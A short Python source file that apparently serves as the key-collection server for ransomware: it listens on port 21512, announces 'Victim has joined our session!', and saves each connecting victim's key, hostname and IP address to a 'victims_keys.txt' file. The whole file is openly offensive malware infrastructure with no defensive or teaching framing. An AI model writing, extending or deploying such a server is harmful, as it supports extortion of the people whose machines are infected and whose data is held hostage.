import socket
import os

file_keys = os.path.join(os.path.expanduser('~/Desktop'), 'victims_keys.txt')

class Server:
    def __init__(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as self.sock:
            self.sock.bind(('0.0.0.0', 21512))
            self.sock.listen()
            self.conn, self.addr = self.sock.accept()
            if self.conn:
                print(f'Victim has joined our session! - {self.addr}')
                self.recv_info()
    def recv_info(self):
        self.key = self.conn.recv(1024).decode()
        self.hostname = self.conn.recv(1024).decode()
        self.ip_address = self.conn.recv(1024).decode()
        if not os.path.exists(file_keys):
            with open(file_keys, 'w') as f:
                f.write(self.key)
                f.write(self.hostname)
                f.write(self.ip_address)
        else:
            with open(file_keys, 'a') as f:
                f.write(self.key)
                f.write(self.hostname)
                f.write(self.ip_address)
